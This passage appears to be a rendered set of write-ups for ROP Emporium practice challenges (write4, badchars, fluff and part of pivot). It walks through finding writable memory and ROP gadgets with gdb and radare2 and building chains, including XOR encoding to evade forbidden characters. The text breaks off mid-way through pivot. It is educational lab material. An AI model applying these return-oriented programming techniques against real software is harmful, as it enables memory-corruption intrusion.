+<li>nx true (i.e. DEP enabled)</li>
+<li>pic false (i.e. not PIE)</li>
+</ul>
+<h2 id="find-readable-and-writeable-area-of-memory"><a class="header" href="#find-readable-and-writeable-area-of-memory">Find readable and writeable area of memory</a></h2>
+<ul>
+<li>1st terminal, run ELF binary and keep it open</li>
+<li>2nd terminal, search proc maps of running process for readable and writeable memory:</li>
+</ul>
+<blockquote>
+<p>$ <code>cat /proc/$(pgrep -f ./write4)/maps | grep rw</code></p>
+</blockquote>
+<pre><code>00601000-00602000 rw-p 00001000 fe:01 656469                             /&lt;write4_filepath&gt;
+[...]
+</code></pre>
+<ul>
+<li>Step through binary in GDB and search for free memory between <code>00601000-00602000</code> to place &quot;flag.txt&quot; string</li>
+<li>Ensure there are null bytes after chosen memory address so that null terminator does not need to be added manually</li>
+</ul>
+<blockquote>
+<p>$ <code>gdb -q ./write4</code><br />
+(gdb) <code>start</code><br />
+(gdb) <code>disass pwnme</code></p>
+</blockquote>
+<pre><code>Dump of assembler code for function pwnme:
+[...]
+   0x00007fa8efa1092f &lt;+133&gt;:	call   0x7fa8efa10770 &lt;read@plt&gt;
+   0x00007fa8efa10934 &lt;+138&gt;:	lea    rdi,[rip+0xf1]        # 0x7fa8efa10a2c
+   0x00007fa8efa1093b &lt;+145&gt;:	call   0x7fa8efa10730 &lt;puts@plt&gt;
+[...]
+End of assembler dump.
+</code></pre>
+<ul>
+<li>Set breakpoint after read() instruction</li>
+</ul>
+<blockquote>
+<p>(gdb) <code>b *pwnme+138</code><br />
+(gdb) <code>c</code></p>
+</blockquote>
+<pre><code>Continuing.
+write4 by ROP Emporium
+x86_64
+
+Go ahead and give me the input already!
+
+&gt; AAAAAAAA
+</code></pre>
+<blockquote>
+<p>(gdb) <code>x/512gx 0x601000</code></p>
+</blockquote>
+<pre><code>[...]
+0x6019f0:	0x0000000000000000	0x0000000000000000
+0x601a00:	0x0000000000000000	0x0000000000000000
+0x601a10:	0x0000000000000000	0x0000000000000000
+[...]
+</code></pre>
+<ul>
+<li>Memory address <code>0x601a00</code> looks like it matches criteria</li>
+</ul>
+<h2 id="get-rop-gadgets-2"><a class="header" href="#get-rop-gadgets-2">Get ROP Gadgets</a></h2>
+<blockquote>
+<p>$ <code>r2 -A ./write4</code></p>
+</blockquote>
+<ul>
+<li>Search for gadget that writes to memory</li>
+</ul>
+<blockquote>
+<p>[0x00400520]&gt; <code>/R mov qword</code></p>
+</blockquote>
+<pre><code>[...]
+  0x00400628             4d893e  mov qword [r14], r15
+  0x0040062b                 c3  ret
+[...]
+</code></pre>
+<ul>
+<li>Search for gadget that pops r14 and pops r15</li>
+</ul>
+<blockquote>
+<p>[0x00400520]&gt; <code>/R pop r14</code></p>
+</blockquote>
+<pre><code>[...]
+  0x00400690               415e  pop r14
+  0x00400692               415f  pop r15
+  0x00400694                 c3  ret
+</code></pre>
+<ul>
+<li>Search for gadget that pops rdi</li>
+</ul>
+<blockquote>
+<p>[0x00400520]&gt; <code>/R pop rdi</code></p>
+</blockquote>
+<pre><code>  0x00400693                 5f  pop rdi
+  0x00400694                 c3  ret
+</code></pre>
+<ul>
+<li>Luckily there's a function that prints from file</li>
+</ul>
+<blockquote>
+<p>[0x00400520]&gt; <code>pdf @ sym.usefulFunction</code></p>
+</blockquote>
+<pre><code>╭ 17: sym.usefulFunction ();
+│           0x00400617      55             push rbp
+│           0x00400618      4889e5         mov rbp, rsp
+│           0x0040061b      bfb4064000     mov edi, str.nonexistent    ; 0x4006b4 ; &quot;nonexistent&quot;
+│           0x00400620      e8ebfeffff     call sym.imp.print_file
+│           0x00400625      90             nop
+│           0x00400626      5d             pop rbp
+╰           0x00400627      c3             ret
+</code></pre>
+<h2 id="get-flag-3"><a class="header" href="#get-flag-3">Get Flag</a></h2>
+<blockquote>
+<p>$ <code>python get_flag.py</code></p>
+</blockquote>
+<pre><code>write4 by ROP Emporium
+x86_64
+
+Go ahead and give me the input already!
+
+&gt; Thank you!
+ROPE{a_placeholder_32byte_flag!}
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="rop-emporium---05-badchars-x86_64"><a class="header" href="#rop-emporium---05-badchars-x86_64">ROP Emporium - 05 badchars x86_64</a></h1>
+<h2 id="elf-binary-info-4"><a class="header" href="#elf-binary-info-4">ELF Binary Info</a></h2>
+<blockquote>
+<p>$ <code>rabin2 -I ./badchars</code></p>
+</blockquote>
+<pre><code>arch     x86
+baddr    0x400000
+binsz    6523
+bintype  elf
+bits     64
+canary   false
+class    ELF64
+compiler GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
+crypto   false
+endian   little
+havecode true
+intrp    /lib64/ld-linux-x86-64.so.2
+laddr    0x0
+lang     c
+linenum  true
+lsyms    true
+machine  AMD x86-64 architecture
+maxopsz  16
+minopsz  1
+nx       true
+os       linux
+pcalign  0
+pic      false
+relocs   true
+relro    partial
+rpath    .
+sanitiz  false
+static   false
+stripped false
+subsys   linux
+va       true
+</code></pre>
+<ul>
+<li>canary false</li>
+<li>nx true (i.e. DEP enabled)</li>
+<li>pic false (i.e. not PIE)</li>
+</ul>
+<h2 id="find-readable-and-writeable-area-of-memory-1"><a class="header" href="#find-readable-and-writeable-area-of-memory-1">Find readable and writeable area of memory</a></h2>
+<ul>
+<li>1st terminal, run ELF binary and keep it open</li>
+<li>2nd terminal, search proc maps of running process for readable and writeable memory:</li>
+</ul>
+<blockquote>
+<p>$ <code>cat /proc/$(pgrep -f ./badchars)/maps | grep rw</code></p>
+</blockquote>
+<pre><code>00601000-00602000 rw-p 00001000 fe:01 656477                             /&lt;badchars_filepath&gt;
+[...]
+</code></pre>
+<ul>
+<li>Step through binary in GDB and search for free memory between <code>00601000-00602000</code> to place &quot;flag.txt&quot; string</li>
+<li>Ensure there are null bytes after chosen memory address so that null terminator does not need to be added manually</li>
+</ul>
+<blockquote>
+<p>$ <code>gdb -q ./badchars</code><br />
+(gdb) <code>start</code><br />
+(gdb) <code>disass pwnme</code></p>
+</blockquote>
+<pre><code>Dump of assembler code for function pwnme:
+[...]
+   0x00007f97526e5987 &lt;+141&gt;:	call   0x7f97526e57c0 &lt;read@plt&gt;
+   0x00007f97526e598c &lt;+146&gt;:	mov    QWORD PTR [rbp-0x40],rax
+   0x00007f97526e5990 &lt;+150&gt;:	mov    QWORD PTR [rbp-0x38],0x0
+[...]
+End of assembler dump.
+</code></pre>
+<ul>
+<li>Set breakpoint after read() instruction</li>
+</ul>
+<blockquote>
+<p>(gdb) <code>b *pwnme+146</code><br />
+(gdb) <code>c</code></p>
+</blockquote>
+<pre><code>Continuing.
+badchars by ROP Emporium
+x86_64
+
+Go ahead and give me the input already!
+
+&gt; AAAAAAAA
+</code></pre>
+<blockquote>
+<p>(gdb) <code>x/512gx 0x601000</code></p>
+</blockquote>
+<pre><code>[...]
+0x6019f0:	0x0000000000000000	0x0000000000000000
+0x601a00:	0x0000000000000000	0x0000000000000000
+0x601a10:	0x0000000000000000	0x0000000000000000
+[...]
+</code></pre>
+<ul>
+<li>Memory address <code>0x601a00</code> looks like it matches criteria</li>
+</ul>
+<h2 id="get-rop-gadgets-3"><a class="header" href="#get-rop-gadgets-3">Get ROP Gadgets</a></h2>
+<blockquote>
+<p>$ <code>r2 -A ./badchars</code></p>
+</blockquote>
+<ul>
+<li>Search for gadget that writes to memory</li>
+</ul>
+<blockquote>
+<p>[0x00400520]&gt; <code>/R mov qword</code></p>
+</blockquote>
+<pre><code>[...]
+  0x00400634           4d896500  mov qword [r13], r12
+  0x00400638                 c3  ret
+[...]
+</code></pre>
+<ul>
+<li>Search for gadget that pops r12 and pops r13</li>
+</ul>
+<blockquote>
+<p>[0x00400520]&gt; <code>/R pop r12</code></p>
+</blockquote>
+<pre><code>  0x0040069c               415c  pop r12
+  0x0040069e               415d  pop r13
+  0x004006a0               415e  pop r14
+  0x004006a2               415f  pop r15
+  0x004006a4                 c3  ret
+[...]
+</code></pre>
+<ul>
+<li>Search for gadget that pops rdi</li>
+</ul>
+<blockquote>
+<p>[0x00400520]&gt; <code>/R pop rdi</code></p>
+</blockquote>
+<pre><code>  0x004006a3                 5f  pop rdi
+  0x004006a4                 c3  ret
+</code></pre>
+<ul>
+<li>Luckily there's a function that prints from file</li>
+</ul>
+<blockquote>
+<p>[0x00400520]&gt; <code>pdf @ sym.usefulFunction</code></p>
+</blockquote>
+<pre><code>╭ 17: sym.usefulFunction ();
+│           0x00400617      55             push rbp
+│           0x00400618      4889e5         mov rbp, rsp
+│           0x0040061b      bfc4064000     mov edi, str.nonexistent    ; 0x4006c4 ; &quot;nonexistent&quot;
+│           0x00400620      e8ebfeffff     call sym.imp.print_file
+│           0x00400625      90             nop
+│           0x00400626      5d             pop rbp
+╰           0x00400627      c3             ret
+</code></pre>
+<ul>
+<li>With above gadgets, string can be written to memory, popped into rdi and print_file function called (similar to previous level)</li>
+<li>However, this challenge prevents use of characters <code>'x', 'g', 'a', '.'</code>, so search for gadgets that can work around this restriction:</li>
+</ul>
+<blockquote>
+<p>[0x00400520]&gt; <code>/R xor byte</code></p>
+</blockquote>
+<pre><code>[...]
+  0x00400628             453037  xor byte [r15], r14b
+  0x0040062b                 c3  ret
+[...]
+</code></pre>
+<ul>
+<li>Able to xor a value in memory one byte at a time, so first xor &quot;flag.txt&quot; with another value e.g. &quot;^&quot;:</li>
+</ul>
+<blockquote>
+<p><code>&quot;flag.txt&quot; ^ &quot;^^^^^^^^&quot; == &quot;82?9p*&amp;*&quot;</code></p>
+</blockquote>
+<ul>
+<li>Therefore <code>&quot;82?9p*&amp;*&quot;</code> will be initially inserted into memory at address <code>0x601a00</code></li>
+<li>After xor'ing each char with <code>&quot;^&quot;</code>, result will be <code>&quot;flag.txt&quot;</code> again</li>
+</ul>
+<h2 id="get-flag-4"><a class="header" href="#get-flag-4">Get Flag</a></h2>
+<blockquote>
+<p>$ <code>python get_flag.py</code></p>
+</blockquote>
+<pre><code>badchars by ROP Emporium
+x86_64
+
+badchars are: 'x', 'g', 'a', '.'
+&gt; Thank you!
+ROPE{a_placeholder_32byte_flag!}
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="rop-emporium---06-fluff-x86_64"><a class="header" href="#rop-emporium---06-fluff-x86_64">ROP Emporium - 06 fluff x86_64</a></h1>
+<h2 id="elf-binary-info-5"><a class="header" href="#elf-binary-info-5">ELF Binary Info</a></h2>
+<blockquote>
+<p>$ <code>rabin2 -I ./fluff</code></p>
+</blockquote>
+<pre><code>arch     x86
+baddr    0x400000
+binsz    6526
+bintype  elf
+bits     64
+canary   false
+class    ELF64
+compiler GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
+crypto   false
+endian   little
+havecode true
+intrp    /lib64/ld-linux-x86-64.so.2
+laddr    0x0
+lang     c
+linenum  true
+lsyms    true
+machine  AMD x86-64 architecture
+maxopsz  16
+minopsz  1
+nx       true
+os       linux
+pcalign  0
+pic      false
+relocs   true
+relro    partial
+rpath    .
+sanitiz  false
+static   false
+stripped false
+subsys   linux
+va       true
+</code></pre>
+<ul>
+<li>canary false</li>
+<li>nx true (i.e. DEP enabled)</li>
+<li>pic false (i.e. not PIE)</li>
+</ul>
+<h2 id="find-readable-and-writeable-area-of-memory-2"><a class="header" href="#find-readable-and-writeable-area-of-memory-2">Find readable and writeable area of memory</a></h2>
+<ul>
+<li>1st terminal, run ELF binary and keep it open</li>
+<li>2nd terminal, search proc maps of running process for readable and writeable memory:</li>
+</ul>
+<blockquote>
+<p>$ <code>cat /proc/$(pgrep -f ./fluff)/maps | grep rw</code></p>
+</blockquote>
+<pre><code>00601000-00602000 rw-p 00001000 fe:01 656467                             /&lt;fluff_filepath&gt;
+[...]
+</code></pre>
+<ul>
+<li>Step through binary in GDB and search for free memory between <code>00601000-00602000</code> to place &quot;flag.txt&quot; string</li>
+<li>Ensure there are null bytes after chosen memory address so that null terminator does not need to be added manually</li>
+</ul>
+<blockquote>
+<p>$ <code>gdb -q ./fluff</code><br />
+(gdb) <code>start</code><br />
+(gdb) <code>disass pwnme</code></p>
+</blockquote>
+<pre><code>Dump of assembler code for function pwnme:
+[...]
+   0x00007f160f97e92f &lt;+133&gt;:	call   0x7f160f97e770 &lt;read@plt&gt;
+   0x00007f160f97e934 &lt;+138&gt;:	lea    rdi,[rip+0x110]        # 0x7f160f97ea4b
+   0x00007f160f97e93b &lt;+145&gt;:	call   0x7f160f97e730 &lt;puts@plt&gt;
+[...]
+End of assembler dump.
+</code></pre>
+<ul>
+<li>Set breakpoint after read() instruction</li>
+</ul>
+<blockquote>
+<p>(gdb) <code>b *pwnme+138</code><br />
+(gdb) <code>c</code></p>
+</blockquote>
+<pre><code>Continuing.
+fluff by ROP Emporium
+x86_64
+
+Go ahead and give me the input already!
+
+&gt; AAAAAAAA
+</code></pre>
+<blockquote>
+<p>(gdb) <code>x/512gx 0x601000</code></p>
+</blockquote>
+<pre><code>[...]
+0x6019f0:	0x0000000000000000	0x0000000000000000
+0x601a00:	0x0000000000000000	0x0000000000000000
+0x601a10:	0x0000000000000000	0x0000000000000000
+[...]
+</code></pre>
+<ul>
+<li>Memory address <code>0x601a00</code> looks like it matches criteria</li>
+</ul>
+<h2 id="look-for-rop-gadgets"><a class="header" href="#look-for-rop-gadgets">Look for ROP Gadgets</a></h2>
+<blockquote>
+<p>$ <code>r2 -A ./fluff</code></p>
+</blockquote>
+<ul>
+<li>Most of the obvious ROP gadgets from earlier levels were not present in this binary, so we need to start devling into the realms of some of the more obscure instructions</li>
+<li>Have a look at the binary's symbols:</li>
+</ul>
+<blockquote>
+<p>[0x00400520]&gt; <code>is</code></p>
+</blockquote>
+<pre><code>[...]
+35  0x00000617 0x00400617 LOCAL  FUNC   17       usefulFunction
+36  ---------- 0x00000000 LOCAL  FILE   0        /tmp/ccipmRw8.o
+37  0x00000628 0x00400628 LOCAL  NOTYPE 0        questionableGadgets
+[...]
+</code></pre>
+<ul>
+<li>Print disassembly, 10 lines, starting from <code>questionableGadgets</code></li>
+</ul>
+<blockquote>
+<p>[0x00400520]&gt; <code>pd 10 @ loc.questionableGadgets</code></p>
+</blockquote>
+<pre><code>    ;-- questionableGadgets:
+    0x00400628      d7             xlatb
+    0x00400629      c3             ret
+    0x0040062a      5a             pop rdx
+    0x0040062b      59             pop rcx
+    0x0040062c      4881c1f23e00.  add rcx, 0x3ef2
+    0x00400633      c4e2e8f7d9     bextr rbx, rcx, rdx
+    0x00400638      c3             ret
+    0x00400639      aa             stosb byte [rdi], al
+    0x0040063a      c3             ret
+    0x0040063b      0f1f440000     nop dword [rax + rax]
+</code></pre>
+<ul>
+<li>Disassemble function <code>usefulFunction</code></li>
+</ul>
+<blockquote>
+<p>[0x00400520]&gt; <code>pdf @ sym.usefulFunction</code></p>
+</blockquote>
+<pre><code>╭ 17: sym.usefulFunction ();
+│           0x00400617      55             push rbp
+│           0x00400618      4889e5         mov rbp, rsp
+│           0x0040061b      bfc4064000     mov edi, str.nonexistent    ; 0x4006c4 ; &quot;nonexistent&quot;
+│           0x00400620      e8ebfeffff     call sym.imp.print_file
+│           0x00400625      90             nop
+│           0x00400626      5d             pop rbp
+╰           0x00400627      c3             ret
+</code></pre>
+<ul>
+<li>Search for <code>pop rdi</code> instruction
+&gt;[0x00400520]&gt; <code>/R pop rdi</code></li>
+</ul>
+<pre><code>  0x004006a3                 5f  pop rdi
+  0x004006a4                 c3  ret
+</code></pre>
+<h2 id="understanding-available-gadgets"><a class="header" href="#understanding-available-gadgets">Understanding Available Gadgets</a></h2>
+<h3 id="stosb-store-string-a-hrefhttpswwwintelcomcontentdamwwwpublicusendocumentsmanuals64-ia-32-architectures-software-developer-instruction-set-reference-manual-325383pdfintel-64-and-ia-32-manual-page-1300a"><a class="header" href="#stosb-store-string-a-hrefhttpswwwintelcomcontentdamwwwpublicusendocumentsmanuals64-ia-32-architectures-software-developer-instruction-set-reference-manual-325383pdfintel-64-and-ia-32-manual-page-1300a">stosb (Store String): <a href="https://www.intel.com/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-software-developer-instruction-set-reference-manual-325383.pdf">Intel 64 and IA-32 Manual, page 1300</a></a></h3>
+<ul>
+<li><code>stosb byte [rdi], al</code>: Store AL at address RDI</li>
+<li>NOTE: After the byte is transferred from the register to the memory location, the RDI register is incremented or decremented according to the setting of the DF flag in the EFLAGS register. If the DF flag is 0, the register is incremented; if the DF flag is 1, the register is decremented (the register is incremented or decremented by 1 for byte operations, by 2 for word operations, by 4 for doubleword operations).</li>
+<li>With this instruction we are able to store values in memory, but we need to be able to control AL to do this.</li>
+</ul>
+<h3 id="xlatb-table-look-up-translation-a-hrefhttpswwwintelcomcontentdamwwwpublicusendocumentsmanuals64-ia-32-architectures-software-developer-instruction-set-reference-manual-325383pdfintel-64-and-ia-32-manual-page-1948a"><a class="header" href="#xlatb-table-look-up-translation-a-hrefhttpswwwintelcomcontentdamwwwpublicusendocumentsmanuals64-ia-32-architectures-software-developer-instruction-set-reference-manual-325383pdfintel-64-and-ia-32-manual-page-1948a">xlatb (Table Look-up Translation): <a href="https://www.intel.com/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-software-developer-instruction-set-reference-manual-325383.pdf">Intel 64 and IA-32 Manual, page 1948</a></a></h3>
+<ul>
+<li><code>xlatb</code>: Set AL to memory byte [RBX + unsigned AL]</li>
+<li>With this instruction we are able to set AL, but we need to be able to control RBX to do this.</li>
+<li>NOTE: Will need to correct for current value of AL each time this instruction is used.</li>
+</ul>
+<h3 id="bextr-bit-field-extract-a-hrefhttpswwwintelcomcontentdamwwwpublicusendocumentsmanuals64-ia-32-architectures-software-developer-instruction-set-reference-manual-325383pdfintel-64-and-ia-32-manual-page-182a"><a class="header" href="#bextr-bit-field-extract-a-hrefhttpswwwintelcomcontentdamwwwpublicusendocumentsmanuals64-ia-32-architectures-software-developer-instruction-set-reference-manual-325383pdfintel-64-and-ia-32-manual-page-182a">BEXTR (Bit Field Extract): <a href="https://www.intel.com/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-software-developer-instruction-set-reference-manual-325383.pdf">Intel 64 and IA-32 Manual, page 182</a></a></h3>
+<ul>
+<li><code>bextr rbx, rcx, rdx</code>: Contiguous bitwise extract from RCX using RDX as control; store result in RBX</li>
+<li>Extracts contiguous bits from RCX using an index value and length value specified in RDX.</li>
+<li>Bit 7:0 of RDX specifies the starting bit position of bit extraction. A START value exceeding the operand size will not extract any bits from RDX.</li>
+<li>Bit 15:8 of RDX specifies the maximum number of bits (LENGTH) beginning at the START position to extract.</li>
+<li>Only bit positions up to (OperandSize -1) of RCX are extracted.</li>
+<li>The extracted bits are written to RBX, starting from the least significant bit.</li>
+<li>All higher order bits in RBX (starting at bit position LENGTH) are zeroed.</li>
+<li>RBX is cleared if no bits are extracted.</li>
+<li>Therefore RBX can be set if we can control RCX and RDX.</li>
+<li>We will want to set RDX to value 0x0000000000004000 (Bit 15:8 = 0x40 to extract 64 bits; Bit 7:0 = 0x00 to start from beginning)</li>
+</ul>
+<h3 id="contraints"><a class="header" href="#contraints">Contraints</a></h3>
+<ul>
+<li><code>pop rdx; pop rcx; add rcx, 0x3ef2</code></li>
+<li>These instructions allow us to control RCX and RDX.</li>
+<li>NOTE: need to correct for <code>add rcx, 0x3ef2</code> by placing a value 0x3ef2 lower than desired value to pop RCX.</li>
+</ul>
+<h2 id="building-rop-chain"><a class="header" href="#building-rop-chain">Building ROP Chain</a></h2>
+<p>Goal is to store <code>&quot;flag.txt&quot;</code> string at known memory address, pop the memory address of this string, then call <code>print_file</code> function to get the flag. Therefore, working backwards, ROP chain will be:</p>
+<ul>
+<li>Address of <code>pop rdi</code> ROP gadget</li>
+<li>Value to pop into RDI == chosen memory address where we'll store target string <code>&quot;flag.txt&quot;</code> (e.g. <code>0x601a00</code> found earlier)</li>
+<li>Loop for each memory address pointing to byte of target string <code>&quot;flag.txt&quot;</code>:
+<ul>
+<li>Address of <code>pop rdx; pop rcx; add rcx, 0x3ef2</code> ROP gadget</li>
+<li>Value to pop into RDX == <code>0x0000000000004000</code></li>
+<li>Value to pop into RCX == target memory address of bytes that match our target string <code>&quot;flag.txt&quot;</code>, but remembering to correct for (i.e. subtracting) 0x3ef2 gadget constraint and current value of AL (section below covers how bytes of target string were found in the ELF binary)</li>
+<li>Address of <code>bextr rbx, rcx, rdx</code> ROP gadget</li>
+<li>Address of <code>xlatb</code> ROP gadget (NOTE: this instruction sets AL to memory byte [RBX + unsigned AL], which why current value of AL is adjusted for when setting RCX value above)</li>
+<li>Address of <code>stosb</code> ROP gadget (NOTE: this instruction auto-increments RDI, so there is no need to manually adjust for this)</li>
+</ul>
+</li>
+<li>Address of <code>pop rdi</code> ROP gadget</li>
+<li>Value to pop into RDI == chosen memory address where we'll store target string <code>&quot;flag.txt&quot;</code> (e.g. <code>0x601a00</code> found earlier)</li>
+<li>Address of call to <code>print_file</code> function (i.e. <code>0x00400620</code> found earlier)</li>
+</ul>
+<h2 id="searching-for-bytes-of-target-string-in-elf-binary"><a class="header" href="#searching-for-bytes-of-target-string-in-elf-binary">Searching for Bytes of Target String in ELF Binary</a></h2>
+<ul>
+<li>Search the ELF binary for bytes that match our target string <code>&quot;flag.txt&quot;</code> (may need to scroll up/down to locate them)</li>
+</ul>
+<blockquote>
+<p>$ <code>r2 -A ./fluff</code><br />
+[0x00400520]&gt; <code>V</code></p>
+</blockquote>
+<pre><code>- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
+[...]
+0x004003c0  006c 6962 666c 7566 662e 736f 005f 5f67  .libfluff.so.__g
+0x004003d0  6d6f 6e5f 7374 6172 745f 5f00 7072 696e  mon_start__.prin
+[...]
+0x004006c0  0100 0200 6e6f 6e65 7869 7374 656e 7400  ....nonexistent.
+[...]
+</code></pre>
+<ul>
+<li>memory address of &quot;f&quot; = 0x4003c8</li>
+<li>memory address of &quot;l&quot; = 0x4003c1</li>
+<li>memory address of &quot;a&quot; = 0x4003d6</li>
+<li>memory address of &quot;g&quot; = 0x4003cf</li>
+<li>memory address of &quot;.&quot; = 0x4003c9</li>
+<li>memory address of &quot;t&quot; = 0x4003d8</li>
+<li>memory address of &quot;x&quot; = 0x4006c8</li>
+<li>memory address of &quot;t&quot; = 0x4003d8</li>
+</ul>
+<h2 id="correcting-for-existing-value-of-al"><a class="header" href="#correcting-for-existing-value-of-al">Correcting for Existing Value of AL</a></h2>
+<ul>
+<li>For 2nd iteration of loop onward (e.g. characters <code>&quot;l&quot;</code>, <code>&quot;a&quot;</code>, <code>&quot;g&quot;</code>, <code>&quot;.&quot;</code>, <code>&quot;t&quot;</code>, <code>&quot;x&quot;</code>, <code>&quot;t&quot;</code>), then the value of AL is known (i.e. the value of the <strong>previous</strong> character)</li>
+<li>However, for the first iteration (e.g. trying to set character <code>&quot;f&quot;</code>), we need to look at the state of the program's registers at the point of execution, so step through program in GDB:</li>
+</ul>
+<blockquote>
+<p>$ <code>gdb -q ./fluff</code><br />
+(gdb) <code>start</code><br />
+(gdb) <code>disass pwnme</code></p>
+</blockquote>
+<pre><code>   0x00007efc2f06392f &lt;+133&gt;:	call   0x7efc2f063770 &lt;read@plt&gt;
+   0x00007efc2f063934 &lt;+138&gt;:	lea    rdi,[rip+0x110]        # 0x7efc2f063a4b
+   0x00007efc2f06393b &lt;+145&gt;:	call   0x7efc2f063730 &lt;puts@plt&gt;
+   0x00007efc2f063940 &lt;+150&gt;:	nop
+   0x00007efc2f063941 &lt;+151&gt;:	leave  
+   0x00007efc2f063942 &lt;+152&gt;:	ret   
+</code></pre>
+<ul>
+<li>Set breakpoint at <code>ret</code> instruction and continue</li>
+</ul>
+<blockquote>
+<p>(gdb) <code>b *pwnme+152</code><br />
+(gdb) <code>c</code></p>
+</blockquote>
+<pre><code>Continuing.
+fluff by ROP Emporium
+x86_64
+
+You know changing these strings means I have to rewrite my solutions...
+&gt; AAAAAAAA
+Thank you!
+</code></pre>
+<ul>
+<li>Look up current value of AL:</li>
+</ul>
+<blockquote>
+<p>(gdb) <code>p/x $al</code><br />
+<code>$1 = 0xb</code></p>
+</blockquote>
+<ul>
+<li>Therefore, need to adjust for <code>0x0b</code> in first iteration of loop</li>
+</ul>
+<h2 id="get-flag-5"><a class="header" href="#get-flag-5">Get Flag</a></h2>
+<ul>
+<li>Place script the <a href="rop_emporium/solutions/x86_64/06-fluff/./get_flag.py">get_flag.py</a> Python script in the same folder as the challenge's files, then run the script:</li>
+</ul>
+<blockquote>
+<p>$ <code>python get_flag.py</code></p>
+</blockquote>
+<pre><code>fluff by ROP Emporium
+x86_64
+
+You know changing these strings means I have to rewrite my solutions...
+&gt; Thank you!
+ROPE{a_placeholder_32byte_flag!}
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="rop-emporium---07-pivot-x86_64"><a class="header" href="#rop-emporium---07-pivot-x86_64">ROP Emporium - 07 pivot x86_64</a></h1>
+<h2 id="elf-binary-info-6"><a class="header" href="#elf-binary-info-6">ELF Binary Info</a></h2>
+<blockquote>
+<p>$ <code>rabin2 -I ./pivot</code></p>
+</blockquote>
+<pre><code>arch     x86
+baddr    0x400000
+binsz    6973
+bintype  elf
+bits     64
+canary   false
+class    ELF64
+compiler GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
+crypto   false
+endian   little
+havecode true
+intrp    /lib64/ld-linux-x86-64.so.2
+laddr    0x0
+lang     c
+linenum  true
+lsyms    true
+machine  AMD x86-64 architecture
+maxopsz  16
+minopsz  1
+nx       true
+os       linux
+pcalign  0
+pic      false
+relocs   true
+relro    partial
+rpath    .
+sanitiz  false
+static   false
+stripped false
+subsys   linux
+va       true
+</code></pre>
+<ul>
+<li>canary false</li>
+<li>nx true (i.e. DEP enabled)</li>
+<li>pic false (i.e. not PIE)</li>
+</ul>
+<h2 id="run-elf-binary-to-understand-required-inputs"><a class="header" href="#run-elf-binary-to-understand-required-inputs">Run ELF Binary to Understand Required Inputs</a></h2>
+<blockquote>
+<p>$ <code>./pivot</code></p>
+</blockquote>
+<pre><code>pivot by ROP Emporium
+x86_64
+
+Call ret2win() from libpivot
+The Old Gods kindly bestow upon you a place to pivot: 0x7f5bc24b1f10
+Send a ROP chain now and it will land there
+&gt; 11111111
+Thank you!
+
+Now please send your stack smash
+&gt; 22222222
+Thank you!
+
+Exiting
+</code></pre>
+<ul>
+<li>Having now interacted with the program, we know that two separate inputs are required, as shown in the above output</li>
+<li>In the above example, the 1st input was <code>11111111</code> and the 2nd input was <code>22222222</code></li>
+<li>The program gives us a place to pivot our stack to <code>0x7f5bc24b1f10</code>, but if we run the program multiple times, we can see that the pivot location changes everytime we re-run the program:</li>
+</ul>
+<blockquote>
+<p>$ <code>./pivot</code></p>
+</blockquote>
+<pre><code>The Old Gods kindly bestow upon you a place to pivot: 0x7fe029d6bf10
+[...]
+The Old Gods kindly bestow upon you a place to pivot: 0x7f93d81b7f10
+[...]
+The Old Gods kindly bestow upon you a place to pivot: 0x7fbf2be90f10
+[...]
+The Old Gods kindly bestow upon you a place to pivot: 0x7fac4dd64f10
+[...]
+The Old Gods kindly bestow upon you a place to pivot: 0x7f00e1bbef10
+[...]
+The Old Gods kindly bestow upon you a place to pivot: 0x7f85ec39df10
+</code></pre>
+<ul>
+<li>Also note that since the pivot location is printed <strong>before</strong> the 2nd input is requested, we are able to capture it and use it as part of the 2nd input if necessary</li>
+</ul>
+<h2 id="using-gdb-with-a-fifo-for-input"><a class="header" href="#using-gdb-with-a-fifo-for-input">Using GDB with a FIFO for Input</a></h2>
+<ul>
+<li>Use two terminals to make it easier to send input to the running GDB process</li>
+</ul>
+<h3 id="1st-terminal"><a class="header" href="#1st-terminal">1st terminal</a></h3>
+<ul>
+<li>Make a <a href="https://www.man7.org/linux/man-pages/man7/fifo.7.html">FIFO</a> using <code>mkfifo &lt;name_of_fifo&gt;</code>:</li>
+</ul>
+<blockquote>
+<p>$ <code>mkfifo my_fifo</code></p>
+</blockquote>
+<ul>
+<li>Then open ELF binary in GDB (<code>-q</code> is for quiet mode):</li>
+</ul>
+<blockquote>
+<p>$ <code>gdb ./pivot -q</code></p>
+</blockquote>
+<ul>
+<li>Disassemble <code>pwnme</code> function:</li>
+</ul>
+<blockquote>
+<p>(gdb) <code>disass pwnme</code></p>
+</blockquote>
+<pre><code>[...]
+   0x000000000040091d &lt;+44&gt;:	mov    rax,QWORD PTR [rbp-0x28]
+   0x0000000000400921 &lt;+48&gt;:	mov    rsi,rax
+   0x0000000000400924 &lt;+51&gt;:	mov    edi,0x400ac8
+   0x0000000000400929 &lt;+56&gt;:	mov    eax,0x0
+   0x000000000040092e &lt;+61&gt;:	call   0x4006f0 &lt;printf@plt&gt;
+   0x0000000000400933 &lt;+66&gt;:	mov    edi,0x400b08
+   0x0000000000400938 &lt;+71&gt;:	call   0x4006e0 &lt;puts@plt&gt;
+   0x000000000040093d &lt;+76&gt;:	mov    edi,0x400b34
+   0x0000000000400942 &lt;+81&gt;:	mov    eax,0x0
+   0x0000000000400947 &lt;+86&gt;:	call   0x4006f0 &lt;printf@plt&gt;
+   0x000000000040094c &lt;+91&gt;:	mov    rax,QWORD PTR [rbp-0x28]
+   0x0000000000400950 &lt;+95&gt;:	mov    edx,0x100
+   0x0000000000400955 &lt;+100&gt;:	mov    rsi,rax
+   0x0000000000400958 &lt;+103&gt;:	mov    edi,0x0
+   0x000000000040095d &lt;+108&gt;:	call   0x400710 &lt;read@plt&gt;
+   0x0000000000400962 &lt;+113&gt;:	mov    edi,0x400b37
+   0x0000000000400967 &lt;+118&gt;:	call   0x4006e0 &lt;puts@plt&gt;
